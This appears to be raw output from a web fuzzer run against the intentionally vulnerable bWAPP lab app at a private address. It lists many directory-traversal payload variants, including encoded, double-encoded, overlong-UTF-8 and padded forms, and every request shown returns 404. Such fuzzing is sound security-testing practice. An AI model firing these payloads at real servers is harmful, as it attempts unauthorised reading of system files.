426,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\{FILE}
428,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\{FILE}
427,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\{FILE}
429,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\..\{FILE}
430,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\..\..\{FILE}
434,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c{FILE}
435,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c{FILE}
431,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\..\..\..\{FILE}
432,404,9L,39W,http://10.0.2.4/bWAPP//..%5c{FILE}
433,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c{FILE}
437,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
436,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c{FILE}
439,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
441,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\{FILE}
440,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\{FILE}
438,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
443,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
445,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
442,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\{FILE}
444,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
449,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c{FILE}
448,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c{FILE}
447,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
450,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
446,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
451,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
454,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
455,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
458,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c{FILE}
452,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
457,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c{FILE}
456,404,9L,39W,http://10.0.2.4/bWAPP//..%255c{FILE}
453,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
459,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c{FILE}
461,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
460,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c{FILE}
463,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
462,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
464,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\{FILE}
465,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\{FILE}
466,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\{FILE}
468,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
467,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
469,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
473,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c{FILE}
471,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
470,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
472,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c{FILE}
474,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
476,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
475,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
477,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
479,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
478,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
486,404,9L,39W,http://10.0.2.4/bWAPP//\../\../\../\../\../\../\../{FILE}
482,404,9L,39W,http://10.0.2.4/bWAPP//\../\../\../{FILE}
483,404,9L,39W,http://10.0.2.4/bWAPP//\../\../\../\../{FILE}
484,404,9L,39W,http://10.0.2.4/bWAPP//\../\../\../\../\../{FILE}
481,404,9L,39W,http://10.0.2.4/bWAPP//\../\../{FILE}
480,404,9L,39W,http://10.0.2.4/bWAPP//\../{FILE}
485,404,9L,39W,http://10.0.2.4/bWAPP//\../\../\../\../\../\../{FILE}
487,404,9L,39W,http://10.0.2.4/bWAPP//\../\../\../\../\../\../\../\../{FILE}
488,404,9L,39W,http://10.0.2.4/bWAPP///..\{FILE}
489,404,9L,39W,http://10.0.2.4/bWAPP///..\/..\{FILE}
491,404,9L,39W,http://10.0.2.4/bWAPP///..\/..\/..\/..\{FILE}
490,404,9L,39W,http://10.0.2.4/bWAPP///..\/..\/..\{FILE}
494,404,9L,39W,http://10.0.2.4/bWAPP///..\/..\/..\/..\/..\/..\/..\{FILE}
495,404,9L,39W,http://10.0.2.4/bWAPP///..\/..\/..\/..\/..\/..\/..\/..\{FILE}
493,404,9L,39W,http://10.0.2.4/bWAPP///..\/..\/..\/..\/..\/..\{FILE}
492,404,9L,39W,http://10.0.2.4/bWAPP///..\/..\/..\/..\/..\{FILE}
496,404,9L,39W,http://10.0.2.4/bWAPP//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../{FILE}
497,404,9L,39W,http://10.0.2.4/bWAPP//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE}
498,404,9L,39W,http://10.0.2.4/bWAPP//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../{FILE}
513,404,9L,39W,http://10.0.2.4/bWAPP//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../{FILE}
514,404,9L,39W,http://10.0.2.4/bWAPP//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../{FILE}
512,404,9L,39W,http://10.0.2.4/bWAPP//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../{FILE}
528,404,9L,39W,http://10.0.2.4/bWAPP//.../{FILE}
529,404,9L,39W,http://10.0.2.4/bWAPP//.../.../{FILE}
531,404,9L,39W,http://10.0.2.4/bWAPP//.../.../.../.../{FILE}
532,404,9L,39W,http://10.0.2.4/bWAPP//.../.../.../.../.../{FILE}
530,404,9L,39W,http://10.0.2.4/bWAPP//.../.../.../{FILE}
534,404,9L,39W,http://10.0.2.4/bWAPP//.../.../.../.../.../.../.../{FILE}
533,404,9L,39W,http://10.0.2.4/bWAPP//.../.../.../.../.../.../{FILE}
541,404,9L,39W,http://10.0.2.4/bWAPP//...\...\...\...\...\...\{FILE}
543,404,9L,39W,http://10.0.2.4/bWAPP//...\...\...\...\...\...\...\...\{FILE}
538,404,9L,39W,http://10.0.2.4/bWAPP//...\...\...\{FILE}
539,404,9L,39W,http://10.0.2.4/bWAPP//...\...\...\...\{FILE}
536,404,9L,39W,http://10.0.2.4/bWAPP//...\{FILE}
535,404,9L,39W,http://10.0.2.4/bWAPP//.../.../.../.../.../.../.../.../{FILE}
537,404,9L,39W,http://10.0.2.4/bWAPP//...\...\{FILE}
545,404,9L,39W,http://10.0.2.4/bWAPP//..../..../{FILE}
544,404,9L,39W,http://10.0.2.4/bWAPP//..../{FILE}
542,404,9L,39W,http://10.0.2.4/bWAPP//...\...\...\...\...\...\...\{FILE}
540,404,9L,39W,http://10.0.2.4/bWAPP//...\...\...\...\...\{FILE}
546,404,9L,39W,http://10.0.2.4/bWAPP//..../..../..../{FILE}
548,404,9L,39W,http://10.0.2.4/bWAPP//..../..../..../..../..../{FILE}
547,404,9L,39W,http://10.0.2.4/bWAPP//..../..../..../..../{FILE}
553,404,9L,39W,http://10.0.2.4/bWAPP//....\....\{FILE}
550,404,9L,39W,http://10.0.2.4/bWAPP//..../..../..../..../..../..../..../{FILE}
551,404,9L,39W,http://10.0.2.4/bWAPP//..../..../..../..../..../..../..../..../{FILE}
549,404,9L,39W,http://10.0.2.4/bWAPP//..../..../..../..../..../..../{FILE}
552,404,9L,39W,http://10.0.2.4/bWAPP//....\{FILE}
558,404,9L,39W,http://10.0.2.4/bWAPP//....\....\....\....\....\....\....\{FILE}
557,404,9L,39W,http://10.0.2.4/bWAPP//....\....\....\....\....\....\{FILE}
554,404,9L,39W,http://10.0.2.4/bWAPP//....\....\....\{FILE}
555,404,9L,39W,http://10.0.2.4/bWAPP//....\....\....\....\{FILE}
556,404,9L,39W,http://10.0.2.4/bWAPP//....\....\....\....\....\{FILE}
559,404,9L,39W,http://10.0.2.4/bWAPP//....\....\....\....\....\....\....\....\{FILE}
562,404,9L,39W,http://10.0.2.4/bWAPP//........................................................................../../../{FILE}
563,404,9L,39W,http://10.0.2.4/bWAPP//........................................................................../../../../{FILE}
561,404,9L,39W,http://10.0.2.4/bWAPP//........................................................................../../{FILE}
560,404,9L,39W,http://10.0.2.4/bWAPP//........................................................................../{FILE}
568,404,9L,39W,http://10.0.2.4/bWAPP//..........................................................................\{FILE}
569,404,9L,39W,http://10.0.2.4/bWAPP//..........................................................................\..\{FILE}
575,404,9L,39W,http://10.0.2.4/bWAPP//..........................................................................\..\..\..\..\..\..\..\{FILE}
571,404,9L,39W,http://10.0.2.4/bWAPP//..........................................................................\..\..\..\{FILE}
574,404,9L,39W,http://10.0.2.4/bWAPP//..........................................................................\..\..\..\..\..\..\{FILE}
573,404,9L,39W,http://10.0.2.4/bWAPP//..........................................................................\..\..\..\..\..\{FILE}
570,404,9L,39W,http://10.0.2.4/bWAPP//..........................................................................\..\..\{FILE}
572,404,9L,39W,http://10.0.2.4/bWAPP//..........................................................................\..\..\..\..\{FILE}
640,404,9L,39W,http://10.0.2.4/bWAPP//..0x2f{FILE}
641,404,9L,39W,http://10.0.2.4/bWAPP//..0x2f..0x2f{FILE}
645,404,9L,39W,http://10.0.2.4/bWAPP//..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
642,404,9L,39W,http://10.0.2.4/bWAPP//..0x2f..0x2f..0x2f{FILE}
643,404,9L,39W,http://10.0.2.4/bWAPP//..0x2f..0x2f..0x2f..0x2f{FILE}
649,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e/0x2e0x2e/{FILE}
652,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
646,404,9L,39W,http://10.0.2.4/bWAPP//..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
653,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
650,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
651,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
654,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
655,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/{FILE}
644,404,9L,39W,http://10.0.2.4/bWAPP//..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
657,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
656,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x2f{FILE}
647,404,9L,39W,http://10.0.2.4/bWAPP//..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f..0x2f{FILE}
660,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
659,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
664,404,9L,39W,http://10.0.2.4/bWAPP//..0x5c{FILE}
661,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
658,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
662,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
665,404,9L,39W,http://10.0.2.4/bWAPP//..0x5c..0x5c{FILE}
663,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f{FILE}
666,404,9L,39W,http://10.0.2.4/bWAPP//..0x5c..0x5c..0x5c{FILE}
667,404,9L,39W,http://10.0.2.4/bWAPP//..0x5c..0x5c..0x5c..0x5c{FILE}
669,404,9L,39W,http://10.0.2.4/bWAPP//..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
674,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
672,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e\{FILE}
670,404,9L,39W,http://10.0.2.4/bWAPP//..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
671,404,9L,39W,http://10.0.2.4/bWAPP//..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
648,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e/{FILE}
675,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
673,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e\0x2e0x2e\{FILE}
676,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
677,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
668,404,9L,39W,http://10.0.2.4/bWAPP//..0x5c..0x5c..0x5c..0x5c..0x5c{FILE}
678,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
680,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x5c{FILE}
679,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}
681,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
684,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
682,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
683,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
685,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
686,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
688,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%2f{FILE}
687,404,9L,39W,http://10.0.2.4/bWAPP//0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c{FILE}
689,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%2f..%c0%2f{FILE}
690,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%2f..%c0%2f..%c0%2f{FILE}
691,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
692,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
693,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
694,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
695,404,9L,39W,http://10.0.2.4/bWAPP//..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f..%c0%2f{FILE}
698,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
696,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e/{FILE}
697,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
699,404,9L,39W,http://10.0.2.4/bWAPP//%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/{FILE}
